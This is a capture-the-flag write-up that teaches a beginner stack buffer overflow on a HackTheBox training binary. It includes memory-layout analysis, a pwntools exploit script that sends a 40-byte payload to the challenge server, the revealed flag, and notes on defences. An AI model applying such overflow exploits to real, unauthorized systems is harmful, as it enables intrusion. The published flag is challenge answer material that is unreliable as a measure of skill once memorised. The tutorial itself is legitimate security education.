# Getting Started - PWN Challenge Solution Guide
**Difficulty:** Very Easy | **Points:** 975  
**Author:** HackTheBox  
**Date Solved:** November 10, 2025

---

## 📚 Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [What You Need to Know](#what-you-need-to-know)
3. [Tools Required](#tools-required)
4. [Understanding the Vulnerability](#understanding-the-vulnerability)
5. [Step-by-Step Solution](#step-by-step-solution)
6. [The Exploit Code](#the-exploit-code)
7. [Key Takeaways](#key-takeaways)
8. [Additional Resources](#additional-resources)

---

## 🎯 Challenge Overview

This is a **buffer overflow** challenge - one of the most fundamental vulnerabilities in computer security. The goal is to understand how programs store data in memory and exploit weaknesses in this storage mechanism to retrieve a hidden flag.

**Challenge Details:**
- **Server:** 83.136.255.235:37193
- **Binary:** `gs` (64-bit ELF executable)
- **Goal:** Overflow a buffer to overwrite a target value and get the flag

---

## 📖 What You Need to Know

### 1. **What is a Buffer?**
A buffer is simply a chunk of memory used to temporarily store data. Think of it like an array in C:
```c
char buffer[32];  // A buffer that can hold 32 characters
```

### 2. **What is Buffer Overflow?**
Buffer overflow happens when you write MORE data into a buffer than it can hold. The extra data "overflows" into adjacent memory locations.

**Example:**
```c
char buffer[5];  // Can hold only 5 characters
strcpy(buffer, "HELLO WORLD");  // Tries to write 11 characters!
```
The extra 6 characters will overflow into memory that wasn't meant for them!

### 3. **The Stack (Memory Layout)**
Programs store local variables in a region of memory called the **stack**. The stack grows from high memory addresses to low addresses (downward).

**Visual Representation:**
```
Higher Memory Addresses
    ↑
    |
[Return Address] ← Where program should return after function ends
[Saved RBP]      ← Previous stack frame pointer
[Target Value]   ← Our goal: overwrite this!
[Alignment]      ← Padding bytes for memory alignment
[Buffer[31]]     ← End of our 32-byte buffer
[Buffer[30]]
    ...
[Buffer[1]]
[Buffer[0]]      ← Start of buffer
    |
    ↓
Lower Memory Addresses
```

### 4. **Why Does This Work?**
When we write too much data into the buffer, it flows "upward" in memory, overwriting:
1. First: The buffer itself (32 bytes)
2. Next: The alignment padding (8 bytes)
3. Finally: The target value we want to change!

---

## 🛠️ Tools Required

### 1. **Python 3**
Check if installed:
```bash
python3 --version
```

### 2. **Pwntools**
A Python library designed for exploit development.

**Install if needed:**
```bash
pip3 install pwntools
```

**Verify installation:**
```bash
python3 -c "from pwn import *; print('Pwntools is ready!')"
```

### 3. **Basic Linux Commands**
- `file` - Identify file types
- `strings` - Extract readable text from binaries
- `chmod` - Change file permissions

---

## 🔍 Understanding the Vulnerability

### Step 1: Analyze the Binary
```bash
file gs
```
**Output:** `gs: ELF 64-bit LSB pie executable, x86-64`

This tells us:
- **ELF** = Linux executable
- **64-bit** = Uses 64-bit memory addresses
- **Not stripped** = Debug information available

### Step 2: Run the Binary Locally
```bash
./gs
```

The program displays:
1. A visual representation of the stack layout
2. Memory addresses and their values
3. Explains how data flows in memory
4. Asks for input with `>>`

### Step 3: Understand the Stack Layout

The program helpfully shows us the memory layout:

```
Address            | Value                  | Description
-------------------|------------------------|------------------
0x...c50           | 0x0000000000000000    | Buffer start (0 bytes)
0x...c58           | 0x0000000000000000    | Buffer (8 bytes)
0x...c60           | 0x0000000000000000    | Buffer (16 bytes)
0x...c68           | 0x0000000000000000    | Buffer (24 bytes)
0x...c70           | 0x6969696969696969    | Alignment (32 bytes)
0x...c78           | 0x00000000deadbeef    | TARGET (40 bytes) ← WE NEED TO OVERWRITE THIS!
0x...c80           | 0x0000558d73241800    | Saved RBP (48 bytes)
0x...c88           | 0x00007efe8e221c87    | Return Address (56 bytes)
```

**Key Observations:**
- Buffer: 0-31 bytes (32 bytes total)
- Alignment: 32-39 bytes (8 bytes)
- Target: 40-47 bytes (8 bytes) - **This is at 0xdeadbeef**

### Step 4: Calculate the Payload

To overwrite the target value, we need to send:
- **32 bytes** to fill the buffer
- **8 bytes** to fill the alignment
- **Any data** after this will overwrite the target!

**Total:** 40 bytes minimum to reach the target value

---

## 🚀 Step-by-Step Solution

### Step 1: Examine the Provided Files

```bash
ls -la
```
You'll find:
- `gs` - The vulnerable binary
- `wrapper.py` - Template exploit script
- `flag.txt` - Local fake flag for testing
- `glibc/` - Required libraries

### Step 2: Understand the Wrapper Script

Open `wrapper.py`:
```python
from pwn import *

# Connection details
IP   = '0.0.0.0'  # Server IP
PORT = 1337       # Server Port

r = remote(IP, PORT)  # Connect to server

# Craft payload
payload = b'A' * 10  # Default: 10 A's (not enough!)

# Send payload
r.sendline(payload)

# Receive flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

### Step 3: Modify the Script

We need to change:
1. **IP address** to the challenge server
2. **Port number** to the challenge port
3. **Payload size** to 40 bytes (to reach the target)

### Step 4: Updated Script

```python
#!/usr/bin/python3

from pwn import *

# Connection to challenge server
IP   = '83.136.255.235'
PORT = 37193

r = remote(IP, PORT)

# Craft payload: 32 bytes buffer + 8 bytes alignment = 40 bytes
payload = b'A' * 40

# Send payload
r.sendline(payload)

# Read and display flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

### Step 5: Run the Exploit

```bash
python3 wrapper.py
```

**Expected Output:**
```
[+] Opening connection to 83.136.255.235 on port 37193: Done
[+] Flag --> HTB{b0f_tut0r14l5_4r3_g00d}
[*] Closed connection to 83.136.255.235 port 37193
```

🎉 **Success!** You've captured the flag!

---

## 💻 The Exploit Code

### Final `wrapper.py`
```python
#!/usr/bin/python3.8

'''
Buffer Overflow Exploit for "Getting Started" Challenge
========================================================
This script exploits a buffer overflow vulnerability to overwrite
a target value in memory and retrieve the flag.

Vulnerability: The program accepts user input into a 32-byte buffer
               without proper bounds checking.

Exploit: Send 40 bytes of data to overflow the buffer and alignment,
         which overwrites the target value at offset 40.

Requirements: pwntools (pip3 install pwntools)
Usage: python3 wrapper.py
'''

from pwn import *

# === Configuration ===
IP   = '83.136.255.235'  # Challenge server IP
PORT = 37193              # Challenge server port

# === Establish Connection ===
log.info(f"Connecting to {IP}:{PORT}")
r = remote(IP, PORT)

# === Craft Exploit Payload ===
# Memory Layout:
# [0-31]   : Buffer (32 bytes)
# [32-39]  : Alignment (8 bytes)
# [40-47]  : Target value (8 bytes) <- We overwrite this
#
# By sending 40 bytes, we fill the buffer and alignment,
# causing any additional data to overwrite the target value

payload = b'A' * 40  # 40 bytes of 'A' (0x41 in hex)

log.info(f"Payload: {payload}")
log.info(f"Payload length: {len(payload)} bytes")

# === Send Payload ===
r.sendline(payload)

# === Receive Flag ===
# The server will send back the flag when the target is overwritten
flag = r.recvline_contains(b"HTB").strip().decode()
success(f'Flag --> {flag}')

# === Clean Up ===
r.close()
log.info("Connection closed")
```

---

## 🎓 Key Takeaways

### 1. **Buffer Overflow Basics**
- Buffers have fixed sizes
- Writing beyond buffer boundaries can overwrite adjacent memory
- This can change program behavior or reveal sensitive data

### 2. **Memory Layout Matters**
- Understanding the stack layout is crucial
- Variables are stored in predictable locations
- Overflow direction is upward in memory (lower to higher addresses)

### 3. **Exploit Development Process**
1. **Reconnaissance:** Analyze the binary
2. **Understanding:** Map out memory layout
3. **Calculation:** Determine exact payload size
4. **Testing:** Try locally if possible
5. **Exploitation:** Execute against target

### 4. **Defensive Programming**
To prevent buffer overflows:
```c
// Bad (vulnerable):
gets(buffer);
strcpy(dest, source);

// Good (safe):
fgets(buffer, sizeof(buffer), stdin);
strncpy(dest, source, sizeof(dest) - 1);
```

---

## 📚 Additional Resources

### Learn More About Buffer Overflows
1. **OWASP Buffer Overflow Guide**
   - https://owasp.org/www-community/vulnerabilities/Buffer_Overflow

2. **LiveOverflow YouTube Channel**
   - Binary Exploitation / PWN series for beginners

3. **PWNtools Documentation**
   - https://docs.pwntools.com/

4. **Practice Platforms**
   - HackTheBox (pwn challenges)
   - PicoCTF
   - pwnable.kr
   - ROP Emporium

### Key Concepts to Study
- **C Programming:** Pointers, arrays, memory management
- **Assembly Language:** x86/x64 basics
- **Operating Systems:** Memory management, process layout
- **GDB Debugger:** Analyzing program execution
- **Return-Oriented Programming (ROP):** Advanced exploitation

---

## ❓ Common Questions

### Q1: Why exactly 40 bytes?
**A:** The buffer is 32 bytes, followed by 8 bytes of alignment padding. To reach the target value at position 40, we need exactly 40 bytes.

### Q2: What if I send more than 40 bytes?
**A:** The extra bytes will continue overwriting memory, potentially overwriting the saved RBP and return address, which could crash the program or enable more advanced exploits.

### Q3: Why does the program show the memory layout?
**A:** This is an educational challenge. In real-world scenarios, you'd need to use tools like GDB, radare2, or Ghidra to analyze the binary and determine the memory layout.

### Q4: What does 0xdeadbeef mean?
**A:** It's a famous hexadecimal value often used as a placeholder in debugging and testing. "DEADBEEF" spells words in hex notation, making it easy to spot in memory dumps.

### Q5: Is this exploit dangerous in real life?
**A:** Yes! Buffer overflows have been responsible for countless security breaches. This is why modern systems have protections like:
- **DEP/NX:** Prevents code execution on the stack
- **ASLR:** Randomizes memory addresses
- **Stack Canaries:** Detects buffer overflows
- **Compiler Warnings:** Flags dangerous functions

---

## 🏆 Challenge Completed!

**Flag:** `HTB{b0f_tut0r14l5_4r3_g00d}`

You've successfully completed your first PWN challenge! This is just the beginning of your journey into binary exploitation. Keep practicing and exploring more advanced techniques.

**Next Steps:**
1. Try other PWN challenges on HackTheBox
2. Learn about Return-Oriented Programming (ROP)
3. Study stack canaries and how to bypass them
4. Explore format string vulnerabilities
5. Practice with different architectures (ARM, MIPS)

---

## 📝 Notes

**Date Completed:** November 10, 2025  
**Time Spent:** ~15 minutes  
**Difficulty Rating:** 1/10 (Educational/Tutorial)  
**Skills Learned:** Basic buffer overflow, stack layout, pwntools usage

---

*Remember: Use these skills ethically and legally. Only practice on authorized systems and challenges!*

**Happy Hacking! 🚀**
